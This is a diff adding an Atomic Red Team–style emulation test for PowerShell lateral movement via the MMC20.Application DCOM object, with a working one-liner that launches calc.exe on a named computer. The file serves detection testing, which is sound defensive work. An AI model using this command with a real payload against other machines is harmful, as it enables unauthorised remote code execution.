@@ -1,0 +1,31 @@
+{
+  "id": "6dc74eb1-c9d6-4c53-b3b5-6f50ae339673",
+  "name": "PowerShell Lateral Movement using MMC20",
+  "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "9ef6221d-1206-4989-872a-dc7fba5a6192",
+      "type": "execute-command",
+      "data": {
+        "command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"#{computer_name}\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1021.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "computer_name",
+      "type": "string",
+      "description": "Name of Computer",
+      "value": "localhost"
+    }
+  ]
+}
